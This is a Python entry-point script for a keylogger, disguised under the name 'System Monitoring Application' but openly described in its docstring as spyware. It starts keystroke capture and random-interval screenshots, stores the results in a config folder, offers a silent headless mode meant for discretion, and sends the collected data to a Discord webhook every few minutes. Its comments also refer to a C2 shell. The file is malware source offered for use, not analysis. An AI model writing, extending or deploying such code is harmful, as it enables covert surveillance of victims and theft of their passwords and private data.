"""
System Monitoring Application
Version 1.3.0

Keylogger with keystroke capture, screenshots, and Discord exfiltration.
"""

import os
import sys
import json
import argparse
import time
import threading
from pathlib import Path
from datetime import datetime, timedelta
from keystroke_logger import KeystrokeLogger
from screenshot_capture import ScreenshotCapture
from exfiltration import send_to_discord, collect_data
from config import load_config, get_webhook


class SystemMonitoringApp:
    """
    Application principale - Monitoring système professionnel.
    Combine keylogger, capture d'écran, exfiltration Discord et C2 shell.
    """
    
    def __init__(self, headless: bool = True, 
                 exfil_interval: int = 600,
                 webhook_url: str = None,
                 enable_shell: bool = False,
                 shell_port: int = 9999):
        """
        Initialize l'app de monitoring.
        
        Args:
            headless: Mode sans interface (true pour discrétion)
            exfil_interval: Intervalle d'exfiltration en secondes (600 = 10 min pour test)
            webhook_url: URL du webhook Discord
            enable_shell: Activer le shell C2
            shell_port: Port pour le shell (localhost)
        """
        self.headless = headless
        self.config_dir = Path.home() / ".config" / "system_monitor"
        self.config_dir.mkdir(parents=True, exist_ok=True)
        
        self.logger = KeystrokeLogger()
        self.screenshot = ScreenshotCapture(
            output_dir=str(self.config_dir / "logs"),
            interval_min=300,
            interval_max=900
        )
        
        # Configuration exfiltration
        self.webhook_url = webhook_url
        self.exfil_interval = exfil_interval
        
        self.enable_shell = enable_shell
        self.shell_port = shell_port
        
        self.is_running = False
        self.exfil_thread = None
        self.next_exfil_time = None
    
    def _print_banner(self):
        """Display startup banner."""
        if not self.headless:
            print("""
System Monitoring Application v1.3.0
            """)
    
    def _save_config(self):
        """Save configuration."""
        config = {
            'version': '1.3.0',
            'created': time.strftime('%Y-%m-%d %H:%M:%S'),
            'headless_mode': self.headless,
            'exfiltration_enabled': bool(self.webhook_url),
            'exfiltration_interval': self.exfil_interval,
            'features': {
                'keystroke_logging': True,
                'screenshot_capture': True,
                'system_monitoring': True,
                'discord_exfiltration': bool(self.webhook_url)
            }
        }
        
        config_file = self.config_dir / "config.json"
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=2)
    
    def _exfiltration_worker(self):
        """Worker pour l'exfiltration périodique."""
        while self.is_running:
            now = datetime.now()
            
            # Vérifie s'il est temps d'exfiltrer
            if self.next_exfil_time and now >= self.next_exfil_time:
                self._perform_exfiltration()
                self.next_exfil_time = datetime.now() + timedelta(seconds=self.exfil_interval)
            
            time.sleep(5)  # Vérifie toutes les 5 secondes
    
    def _perform_exfiltration(self):
        """Effectue l'exfiltration des données vers Discord."""
        if not self.webhook_url:
            return
        
        try:
            data = collect_data(str(self.config_dir / "logs"))
            
            if not self.headless:
                print(f"\n[📤] Exfiltration vers Discord")
                print(f"    Frappes: {data['total_keystrokes']}")
                print(f"    Captures: {data['screenshots']}")
            
            send_to_discord(self.webhook_url, str(self.config_dir / "logs"))
        
        except Exception as e:
            if not self.headless:
                print(f"[!] Erreur exfiltration: {e}")
    
    def start_monitoring(self):
        """Lance le monitoring complet."""
        if self.is_running:
            return
        
        self.is_running = True
        self.next_exfil_time = datetime.now() + timedelta(seconds=self.exfil_interval)
        
        self._print_banner()
        
        if not self.headless:
            print("[*] Initialisation des composants...")
        
        # Démarre le logging des touches
        self.logger.start()
        
        # Démarre la capture d'écran
        self.screenshot.start()
        
        # Démarre l'exfiltration périodique si webhook configuré
        if self.webhook_url:
            self.exfil_thread = threading.Thread(
                target=self._exfiltration_worker,
                daemon=True
            )
            self.exfil_thread.start()
        
        self._save_config()
        
        if not self.headless:
            print("[+] Keylogger: ACTIVE")
            print("[+] Screenshot capture: ACTIVE")
            if self.webhook_url:
                print(f"[+] Discord exfil: ACTIVE ({self.exfil_interval}s)")
            print("\n[*] Monitoring active... (Ctrl+C to stop)")
    
    def stop_monitoring(self):
        """Stop monitoring."""
        if not self.is_running:
            return
        
        self.is_running = False
        
        self.logger.stop()
        self.screenshot.stop()
        
        # Wait for exfiltration to finish
        if self.exfil_thread:
            self.exfil_thread.join(timeout=5)
        
        if not self.headless:
            print("\n[!] Monitoring stopped")
            self._display_statistics()
    
    def _display_statistics(self):
        """Affiche les statistiques collectées."""
        keystroke_stats = self.logger.get_statistics()
        screenshot_stats = self.screenshot.get_statistics()
        
        print(f"""
╔════════════════════════════════════════════════════════════╗
║                  Monitoring Statistics                     ║
╠════════════════════════════════════════════════════════════╣
│ Keystrokes Logged:    {keystroke_stats['total_keystrokes']:<30} │
│ Screenshots Captured: {screenshot_stats['total_screenshots']:<30} │
│ Session Duration:     {int(keystroke_stats['session_duration'])}s{' '*28} │
│ Total Data Size:      {screenshot_stats['total_size_mb']}MB{' '*32} │
╚════════════════════════════════════════════════════════════╝
        """)
        
        # Affiche le chemin de stockage des données
        log_dir = self.config_dir / "logs"
        print(f"[*] Data stored in: {log_dir}")
        print(f"[*] Config directory: {self.config_dir}")
    
    def run(self):
        """Boucle principale."""
        try:
            self.start_monitoring()
            
            while self.is_running:
                time.sleep(1)
        
        except KeyboardInterrupt:
            self.stop_monitoring()
        except Exception as e:
            print(f"[!] Error: {e}")
            self.stop_monitoring()
            sys.exit(1)


def main():
    """Entry point."""
    parser = argparse.ArgumentParser(
        description='System Monitoring Application v1.3.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py                                    # Local console
  python main.py --webhook <url> --interval 600    # Discord exfil
  python main.py --headless --webhook <url>        # Silent mode

Discord Webhook:
  1. Create webhook in Discord (Server Settings > Integrations)
  2. Copy URL
  3. Run: python main.py --webhook <URL>
        """
    )
    
    parser.add_argument(
        '--headless', '-q',
        action='store_true',
        help='Silent mode (no output)'
    )
    
    parser.add_argument(
        '--webhook', '-w',
        help='Discord webhook URL (or "auto" to use saved)'
    )
    
    parser.add_argument(
        '--interval', '-i',
        type=int,
        default=600,
        help='Exfiltration interval in seconds (default: 600 = 10 min)'
    )
    
    parser.add_argument(
        '--version',
        action='version',
        version='System Monitoring Application v1.3.0'
    )
    
    args = parser.parse_args()
    
    # Resolve webhook URL
    webhook_url = args.webhook
    if webhook_url == "auto":
        webhook_url = get_webhook()
        if webhook_url:
            print("[+] Using saved webhook URL")
        else:
            print("[!] No webhook configured. Run: python discord_setup.py set <URL>")
            webhook_url = None
    
    # Launch app
    app = SystemMonitoringApp(
        headless=args.headless,
        webhook_url=webhook_url,
        exfil_interval=args.interval,
        enable_shell=False,
        shell_port=9999
    )
    app.run()


if __name__ == "__main__":
    main()
